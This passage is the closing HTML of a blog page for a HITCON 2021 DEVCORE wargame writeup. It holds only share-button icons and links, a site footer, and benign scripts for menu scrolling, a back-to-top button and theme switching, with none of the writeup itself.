d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on whatsapp" href="https://api.whatsapp.com/send?text=HITCON%202021%20DEVCORE%20Wargame%20Writeup%20-%20https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on telegram" href="https://telegram.me/share/url?text=HITCON%202021%20DEVCORE%20Wargame%20Writeup&amp;url=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on ycombinator" href="https://news.ycombinator.com/submitlink?t=HITCON%202021%20DEVCORE%20Wargame%20Writeup&u=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://blog.garytan.tw/>Gary Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>